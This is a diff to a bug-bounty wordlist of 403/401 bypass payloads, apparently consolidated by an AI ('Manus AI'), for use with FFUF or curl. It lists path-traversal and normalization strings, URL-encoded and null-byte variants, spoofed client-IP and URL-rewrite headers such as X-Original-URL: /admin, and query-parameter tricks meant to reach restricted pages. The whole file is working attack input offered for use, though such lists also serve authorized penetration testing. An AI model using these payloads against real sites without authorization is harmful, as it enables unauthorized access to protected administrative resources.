@@ -1,4 +1,10 @@
-# Payloads de Bypass de Elite (403/401)
+# =============================================================================
+# SUPER 403/401 BYPASS WORDLIST - ELITE EDITION
+# Consolidada por Manus AI para Bug Bounty Hunters de 6 Dígitos
+# Fontes: daffainfo, Az0x7, Hacktricks, e técnicas de Top Hunters
+# =============================================================================
+
+# --- Path Normalization & Traversal Bypasses ---
 /%2e/
 /./
 /..;/
@@ -16,16 +22,169 @@
 /.xml
 /index.php
 /index.html
-?
-??
-?debug=1
-?admin=1
-?test=1
-# Cabeçalhos para testar via FFUF/Curl
+/%2e%2e%2f/
+/%2e%2e%3b/
+/%2e%2f/
+/%2e%3b/
+/%2e/
+/%2e//
+/..%2f
+/..%2f..%2f
+/..%2f..%2f..%2f
+/../
+/../../
+/../../../
+/../../..//
+/../..//
+/../..//../
+/../..;/
+/.././../
+/../.;/../
+/..//
+/..//../
+/..//../../
+/..//..;/
+/../;/
+/../;/../
+/..;%2f
+/..;%2f..;%2f
+/..;%2f..;%2f..;%2f
+/..;/
+/..;/../
+/..;/..;/
+/..;//
+/..;//../
+/..;//..;/
+/..;/;/
+/..;/;/..;/
+/./
+/.//
+/.;/
+/.;//
+//
+//..
+//../../
+//..;
+//./
+//.;/
+///..
+///../
+///..//
+///..;
+///..;/
+///..;//
+//;/
+/;/
+/;//
+/;?
+/;x
+/;x/
+/?
+/?;
+/x/../
+/x/..//
+/x/../;/
+/x/..;/
+/x/..;//
+/x/..;/;/
+/x//../
+/x//..;/
+/x/;/../
+/x/;/..;/
+
+# --- Encoding & Special Characters ---
+%09
+%09%3b
+%09..
+%09;
+%20
+%23
+%23%3f
+%252f%252f
+%252f/
+%2e%2e
+%2e%2e/
+%2f
+%2f%20%23
+%2f%23
+%2f%2f
+%2f%3b%2f
+%2f%3b%2f%2f
+%2f%3f
+%2f%3f/
+%2f/
+%2f;?
+%2f?;;
+%3b
+%3b%09
+%3b%2f%2e%2e
+%3b%2f%2e%2e%2f%2e%2e%2f%2f
+%3b%2f%2e.
+%3b%2f..
+%3b/%2e%2e/..%2f%2f
+%3b/%2e.
+%3b/%2f%2f../
+%3b/..
+%3b//%2f../
+%3f%23
+%3f%3f
+%3f.php
+..%00/
+..%00/;
+..%00;/
+..%09
+..%0d/
+..%0d/;
+..%0d;/
+..%5c/
+..%ff/
+..%ff/;
+..%ff;/
+..;%00/
+..;%0d/
+..;%ff/
+..;\
+..;\;
+..\
+..\;
+
+# --- Header-Based Bypasses (Use with -H in FFUF/Curl) ---
 X-Forwarded-For: 127.0.0.1
 X-Forwarded-Host: localhost
 X-Custom-IP-Authorization: 127.0.0.1
 X-Original-URL: /admin
 X-Rewrite-URL: /admin
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Client-IP: 127.0.0.1
 True-Client-IP: 127.0.0.1
-Cluster-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Host: 127.0.0.1
+Forwarded: for=127.0.0.1
+Forwarded: for=localhost
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-Port: 443
+X-Forwarded-Port: 80
+X-Forwarded-Scheme: https
+X-Original-Remote-Addr: 127.0.0.1
+
+# --- Logic & Parameter Bypasses ---
+?
+??
+?debug=1
+?admin=1
+?test=1
+?_method=GET
+?_method=POST
+?version=1
+?version=2
+#
+#?
+?#
+?.php
+?;
+??
